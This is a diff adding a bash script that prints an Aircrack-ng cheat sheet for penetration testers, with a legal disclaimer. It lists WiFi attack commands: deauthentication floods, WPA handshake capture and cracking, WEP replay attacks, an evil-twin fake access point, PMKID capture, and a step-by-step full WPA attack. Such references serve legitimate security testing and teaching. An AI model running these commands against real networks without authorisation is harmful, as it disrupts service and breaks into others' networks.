@@ -1,0 +1,239 @@
+#!/usr/bin/env bash
+# ─────────────────────────────────────────────────────────────
+#  acsheet — Aircrack-ng Quick Reference CLI
+#  GitHub: https://github.com/YOUR_USERNAME/aircrack-cheatsheet
+# ─────────────────────────────────────────────────────────────
+
+VERSION="1.0.0"
+
+# ── Colors ────────────────────────────────────────────────────
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+CYAN='\033[0;36m'
+BLUE='\033[0;34m'
+MAGENTA='\033[0;35m'
+WHITE='\033[1;37m'
+DIM='\033[2m'
+BOLD='\033[1m'
+RESET='\033[0m'
+
+# ── Banner ─────────────────────────────────────────────────────
+banner() {
+cat <<EOF
+${RED}${BOLD}
+  █████╗  ██████╗███████╗██╗  ██╗███████╗███████╗████████╗
+ ██╔══██╗██╔════╝██╔════╝██║  ██║██╔════╝██╔════╝╚══██╔══╝
+ ███████║██║     ███████╗███████║█████╗  █████╗     ██║   
+ ██╔══██║██║     ╚════██║██╔══██║██╔══╝  ██╔══╝     ██║   
+ ██║  ██║╚██████╗███████║██║  ██║███████╗███████╗   ██║   
+ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   
+${RESET}${DIM}  Aircrack-ng Cheat Sheet  ·  v${VERSION}  ·  For Educational Use Only${RESET}
+EOF
+}
+
+# ── Divider ────────────────────────────────────────────────────
+div() {
+  echo -e "${DIM}──────────────────────────────────────────────────────────────${RESET}"
+}
+
+# ── Section header ─────────────────────────────────────────────
+section() {
+  echo ""
+  echo -e "${CYAN}${BOLD}  ▸ $1${RESET}"
+  div
+}
+
+# ── Command row ────────────────────────────────────────────────
+cmd() {
+  # cmd "description" "command"
+  printf "  ${YELLOW}%-36s${RESET} ${WHITE}%s${RESET}\n" "$1" "$2"
+}
+
+# ── Code block ─────────────────────────────────────────────────
+code() {
+  echo -e "  ${GREEN}$ ${WHITE}$1${RESET}"
+}
+
+# ── Note ───────────────────────────────────────────────────────
+note() {
+  echo -e "  ${MAGENTA}⚑  $1${RESET}"
+}
+
+# ══════════════════════════════════════════════════════════════
+#  TOPICS
+# ══════════════════════════════════════════════════════════════
+
+show_all() {
+  banner
+  show_workflow
+  show_monitor
+  show_scan
+  show_handshake
+  show_crack
+  show_wep
+  show_advanced
+  show_wordlists
+  show_oneliner
+  disclaimer
+}
+
+show_workflow() {
+  section "BASIC WORKFLOW (Most Common)"
+  printf "  ${BOLD}${BLUE}%-4s  %-22s  %s${RESET}\n" "Step" "Command" "Description"
+  div
+  printf "  ${CYAN}%-4s${RESET}  ${WHITE}%-40s${RESET}  ${DIM}%s${RESET}\n" \
+    "1" "sudo airmon-ng start wlan0"                      "Put interface into monitor mode" \
+    "2" "sudo airodump-ng wlan0mon"                       "Scan for networks & clients" \
+    "3" "sudo airodump-ng -c 6 --bssid AA:BB:.. -w cap"  "Capture specific AP on channel" \
+    "4" "sudo aireplay-ng -0 5 -a AA:BB:.. wlan0mon"     "Send deauth packets" \
+    "5" "sudo aircrack-ng -w wordlist.txt cap-01.cap"    "Crack captured handshake"
+  echo ""
+}
+
+show_monitor() {
+  section "MONITOR MODE & INTERFACE MANAGEMENT"
+  cmd "Enable monitor mode"        "sudo airmon-ng start wlan0"
+  cmd "Disable monitor mode"       "sudo airmon-ng stop wlan0mon"
+  cmd "Kill interfering processes" "sudo airmon-ng check kill"
+  cmd "Check interfaces"           "iwconfig"
+  cmd "Create monitor interface"   "iw phy phy0 interface add mon0 type monitor"
+  echo ""
+}
+
+show_scan() {
+  section "SCANNING & DISCOVERY"
+  cmd "Live scan all channels"     "sudo airodump-ng wlan0mon"
+  cmd "Scan specific channels"     "sudo airodump-ng -c 1,6,11 wlan0mon"
+  cmd "Target one AP"              "sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 wlan0mon"
+  cmd "Save capture to file"       "sudo airodump-ng -w capture --essid MyNetwork wlan0mon"
+  echo ""
+}
+
+show_handshake() {
+  section "CAPTURING WPA/WPA2 HANDSHAKE"
+  cmd "Capture on specific AP"     "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w hs wlan0mon"
+  echo ""
+  note "Deauth all clients (broadcast):"
+  cmd "10 deauths"                 "sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon"
+  cmd "Continuous deauth"          "sudo aireplay-ng -0 0  -a AA:BB:CC:DD:EE:FF wlan0mon"
+  echo ""
+  note "Targeted client deauth:"
+  cmd "Single client"              "sudo aireplay-ng -0 5 -a AA:BB:.. -c 11:22:33:44:55:66 wlan0mon"
+  echo ""
+}
+
+show_crack() {
+  section "CRACKING WPA/WPA2"
+  cmd "Single wordlist"            "aircrack-ng -w rockyou.txt handshake-01.cap"
+  cmd "Multiple wordlists"         "aircrack-ng -w list1.txt,list2.txt capture.cap"
+  cmd "List networks in capture"   "aircrack-ng -J capture handshake-01.cap"
+  cmd "GPU cracking (faster)"      "hashcat -m 22000 hash.hc22000 rockyou.txt"
+  echo ""
+  note "Convert to hashcat format:"
+  code "wpaclean capture.cap cleaned.cap"
+  code "hcxpcapngtool -o hash.hc22000 cleaned.cap"
+  echo ""
+}
+
+show_wep() {
+  section "WEP CRACKING (Legacy)"
+  cmd "Fake authentication"        "aireplay-ng -1 0 -a AP_BSSID wlan0mon"
+  cmd "ARP replay attack"          "aireplay-ng -3 -b AP_BSSID wlan0mon"
+  cmd "Fast WEP crack"             "aircrack-ng -z capture.cap"
+  cmd "Fragmentation attack"       "aireplay-ng -5 -b AP_BSSID wlan0mon"
+  cmd "Chopchop attack"            "aireplay-ng -4 -b AP_BSSID wlan0mon"
+  echo ""
+}
+
+show_advanced() {
+  section "ADVANCED TECHNIQUES"
+  cmd "Evil Twin (Fake AP)"        "airbase-ng -e \"FreeWiFi\" -c 6 wlan0mon"
+  cmd "PMKID Attack (no clients)"  "hcxdumptool -i wlan0mon --enable_status=3"
+  note "PMKID capture → hcxpcapngtool → hashcat"
+  echo ""
+}
+
+show_wordlists() {
+  section "RECOMMENDED WORDLISTS (Kali / Parrot)"
+  echo -e "  ${GREEN}✔${RESET}  /usr/share/wordlists/rockyou.txt"
+  echo -e "  ${GREEN}✔${RESET}  /usr/share/seclists/Passwords/WiFi.txt"
+  echo -e "  ${GREEN}✔${RESET}  weakpass_2a"
+  echo -e "  ${GREEN}✔${RESET}  probable-v2-wpa"
+  echo ""
+}
+
+show_oneliner() {
+  section "QUICK ONE-LINER — FULL WPA ATTACK"
+  echo ""
+  echo -e "  ${DIM}# Step 1: Enable monitor & scan${RESET}"
+  code "sudo airmon-ng start wlan0 && sudo airodump-ng wlan0mon"
+  echo ""
+  echo -e "  ${DIM}# Step 2: Capture (note BSSID + channel from scan)${RESET}"
+  code "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w attack wlan0mon"
+  echo ""
+  echo -e "  ${DIM}# Step 3: Deauth (in a new terminal)${RESET}"
+  code "sudo aireplay-ng -0 8 -a AA:BB:CC:DD:EE:FF wlan0mon"
+  echo ""
+  echo -e "  ${DIM}# Step 4: Crack the handshake${RESET}"
+  code "aircrack-ng -w rockyou.txt attack-01.cap"
+  echo ""
+}
+
+disclaimer() {
+  div
+  echo -e "  ${RED}${BOLD}⚠  LEGAL DISCLAIMER${RESET}"
+  echo -e "  ${DIM}Use only on networks you own or have explicit written permission to test."
+  echo -e "  Unauthorized access to networks is illegal. For educational use only.${RESET}"
+  div
+  echo ""
+}
+
+# ══════════════════════════════════════════════════════════════
+#  HELP / USAGE
+# ══════════════════════════════════════════════════════════════
+
+usage() {
+  banner
+  echo -e "  ${BOLD}USAGE:${RESET}  acsheet [topic]"
+  echo ""
+  echo -e "  ${BOLD}TOPICS:${RESET}"
+  printf "  ${CYAN}%-16s${RESET} %s\n" \
+    "all"        "Show everything (default)" \
+    "workflow"   "Basic 5-step attack workflow" \
+    "monitor"    "Monitor mode & interface management" \
+    "scan"       "Scanning & discovery commands" \
+    "handshake"  "Capturing WPA/WPA2 handshakes" \
+    "crack"      "Cracking commands (WPA/WPA2)" \
+    "wep"        "Legacy WEP cracking" \
+    "advanced"   "Evil Twin, PMKID, hashcat export" \
+    "wordlists"  "Best wordlist recommendations" \
+    "oneliner"   "Full attack one-liner example" \
+    "version"    "Show version"
+  echo ""
+  disclaimer
+}
+
+# ══════════════════════════════════════════════════════════════
+#  ROUTER
+# ══════════════════════════════════════════════════════════════
+
+case "${1:-all}" in
+  all|"")       show_all ;;
+  workflow)     banner; show_workflow; disclaimer ;;
+  monitor)      banner; show_monitor; disclaimer ;;
+  scan)         banner; show_scan; disclaimer ;;
+  handshake)    banner; show_handshake; disclaimer ;;
+  crack)        banner; show_crack; disclaimer ;;
+  wep)          banner; show_wep; disclaimer ;;
+  advanced)     banner; show_advanced; disclaimer ;;
+  wordlists)    banner; show_wordlists; disclaimer ;;
+  oneliner)     banner; show_oneliner; disclaimer ;;
+  version|-v)   echo "acsheet v${VERSION}" ;;
+  help|-h|--help) usage ;;
+  *)
+    echo -e "${RED}Unknown topic: $1${RESET}"
+    echo "Run: acsheet help"
+    exit 1
+    ;;
+esac
